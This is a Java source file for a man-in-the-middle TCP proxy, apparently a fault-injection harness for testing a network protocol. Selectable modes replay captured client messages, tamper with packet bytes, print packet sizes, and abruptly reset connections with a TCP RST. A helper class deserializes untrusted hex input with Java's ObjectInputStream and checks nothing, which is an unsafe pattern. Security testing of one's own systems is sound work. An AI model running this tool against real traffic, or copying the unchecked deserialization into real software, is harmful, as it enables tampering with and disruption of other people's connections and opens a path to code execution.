import java.io.*;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Arrays;
import java.util.concurrent.TimeUnit;
import java.io.*;
import java.util.concurrent.*;

public class MITM {

	private final int listenPort;
	private final String remoteHost;
	private final int remotePort;
	private final String op;
	private final ScheduledExecutorService scheduler = Executors.newScheduledThreadPool(1);

	public MITM(int listenPort, String remoteHost, int remotePort, String op) {
		this.listenPort = listenPort;
		this.remoteHost = remoteHost;
		this.remotePort = remotePort;
		this.op = op;
	}

	public void start() throws IOException {
		ServerSocket serverSocket = new ServerSocket(listenPort);
		System.out.printf("Proxy listening on port %d, forwarding to %s:%d%n",
				listenPort, remoteHost, remotePort);

		while (true) {
			Socket clientSocket = serverSocket.accept();
			Socket serverSocketToRemote = new Socket(remoteHost, remotePort);
			System.out.printf("Accepted connection from %s, connected to remote.%n", clientSocket.getRemoteSocketAddress());

			switch (op) {
				case "r":  // Replay attack
					System.out.printf("Initiating Replay Attack \n");
					new Thread(() -> replayAttack(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					break;

				case "t":  // Timeout attack
					System.out.printf("Initiating Timeout Attack \n");
					//new Thread(() -> timeoutAttack(clientSocket, serverSocketToRemote)).start();
					//new Thread(() -> timeoutAttack(serverSocketToRemote, clientSocket)).start();
					break;

				case "f":  // Byte Flip attack
					System.out.printf("Initiating Byte Flip Attack \n");
					new Thread(() -> byteFlip(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> byteFlip(serverSocketToRemote, clientSocket)).start();
					break;

				case "p":  // Timeout attack
					System.out.printf("Initiating Print Size of Packets \n");
					new Thread(() -> forwardDataSize(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> forwardDataSize(serverSocketToRemote, clientSocket)).start();
					break;

				case "d":  // Connect and Disconnect attack
					System.out.printf("Initiating Connect & Disconnect Attack\n");
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					connectAndDisconnect(clientSocket, 500);
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					break;

				default:   // Normal forward
					new Thread(() -> forwardData(clientSocket, serverSocketToRemote)).start();
					new Thread(() -> forwardData(serverSocketToRemote, clientSocket)).start();
					break;
			}
		}
	}

	private void forwardData(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
				OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {
				out.write(buffer, 0, bytesRead);
				//System.out.println(Arrays.toString(buffer));
				out.flush();
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void forwardDataSize(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
			 OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			while ((bytesRead = in.read(buffer)) != -1) {

				out.write(buffer, 0, bytesRead);
				//System.out.println(Arrays.toString(buffer));
				out.flush();

				if (buffer[0] == 109 && buffer[1] == 58) {
					//System.out.println(Arrays.toString(buffer));
					System.out.println(bytesRead);
				}
			}

		} catch (IOException e) {
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	public static void connectAndDisconnect(Socket inputSocket, int delayMillis) {
		try {
			Thread.sleep(delayMillis);
			System.out.println("Disconnecting abruptly...");
			inputSocket.setSoLinger(true, 0);  // Forces a TCP RST on close
			inputSocket.close();
		} catch (IOException | InterruptedException e) {
			e.printStackTrace();
		} finally {
			if (inputSocket != null && !inputSocket.isClosed()) {
				try {
					inputSocket.close();
				} catch (IOException ignored) {
				}
			}
		}
	}


	private void byteFlip(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
			 OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int count = 0;
			byte[] delayedPacket;
			while ((bytesRead = in.read(buffer)) != -1) {
				if (count != 0) {
					out.write(buffer, 0, bytesRead);
					//System.out.println(Arrays.toString(buffer));
					out.flush();
				} else {
					delayedPacket = new byte[bytesRead];
					System.arraycopy(buffer, 0, delayedPacket, 0, bytesRead);

					for (int i = 0; i < delayedPacket.length; i++) {
						if (delayedPacket[i] == (byte) 124) {
							//remover o |
							//delayedPacket[i] = 105;
							delayedPacket[i-5] = 124;
							System.out.println("Found '|' (124) at position: " + i);
						}
					}
					System.out.println(Arrays.toString(delayedPacket));
					out.write(delayedPacket, 0, bytesRead);
					out.flush();
				}
				count++;
			}
		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
		}
	}

	private void replayAttack(Socket inputSocket, Socket outputSocket) {
		try (InputStream in = inputSocket.getInputStream();
			 OutputStream out = outputSocket.getOutputStream()) {

			byte[] buffer = new byte[4096];
			int bytesRead;
			int messageCount = 0;

			while ((bytesRead = in.read(buffer)) != -1) {
				messageCount++;
				// Immediately forward original message
				out.write(buffer, 0, bytesRead);
				out.flush();

				// Make a copy of the message to replay later
				byte[] messageCopy = new byte[bytesRead];
				System.arraycopy(buffer, 0, messageCopy, 0, bytesRead);

				// If it's one of the first 2 client messages, schedule replay
				if (messageCount == 1 || messageCount == 2) {
					int finalMessageCount = messageCount;
					scheduler.schedule(() -> {
						try {
							out.write(messageCopy);
							out.flush();
							System.out.println("Replayed client message #" + finalMessageCount + " of size " + messageCopy.length);
						} catch (IOException e) {
							e.printStackTrace();
						}
					}, 20, TimeUnit.MILLISECONDS);
				}
			}

		} catch (IOException e) {
			// Connection closed or error – terminate forwarding
		} finally {
			try {
				inputSocket.close();
			} catch (IOException ignored) {
			}
			try {
				outputSocket.close();
			} catch (IOException ignored) {
			}
			scheduler.shutdown();
		}
	}

	private void timeoutAttack(int seconds){
		System.out.println("Sleeping for " + seconds + " seconds via TimeUnit...");
		try {
			TimeUnit.SECONDS.sleep(seconds); // sleeps for 11 seconds
		} catch (InterruptedException e) {
			Thread.currentThread().interrupt(); // restore interrupt status
			System.err.println("Sleep was interrupted");
		}
		System.out.println("Done sleeping!");
	}

	public static void main(String[] args) {
		if (args.length != 4) {
			System.err.println("Usage: java SimpleMITMProxy <listenPort> <remoteHost> <remotePort> <operation>");
			System.exit(1);
		}
		int listenPort = Integer.parseInt(args[0]);
		String remoteHost = args[1];
		int remotePort = Integer.parseInt(args[2]);

		try {
			new MITM(listenPort, remoteHost, remotePort, args[3]).start();
		} catch (IOException e) {
			e.printStackTrace();
		}
		System.exit(0);
	}
}

class ObjectHexDeserializer {

	public static <T> T deserializeFromHex(String hexString, Class<T> clazz)
			throws IOException, ClassNotFoundException {

		byte[] dataBytes = decodeHex(hexString);

		try (ByteArrayInputStream byteIn = new ByteArrayInputStream(dataBytes);
			 ObjectInputStream in = new ObjectInputStream(byteIn)) {
			return clazz.cast(in.readObject());
		}
	}

	public static byte[] decodeHex(String hex) throws IllegalArgumentException {
		if (hex.length() % 2 != 0) {
			throw new IllegalArgumentException("Invalid hexadecimal string length.");
		}

		int len = hex.length();
		byte[] data = new byte[len / 2];

		for (int i = 0; i < len; i += 2) {
			int firstDigit = Character.digit(hex.charAt(i), 16);
			int secondDigit = Character.digit(hex.charAt(i + 1), 16);

			if (firstDigit == -1 || secondDigit == -1) {
				throw new IllegalArgumentException("Invalid character in hex string.");
			}

			data[i / 2] = (byte) ((firstDigit << 4) + secondDigit);
		}

		return data;
	}
}


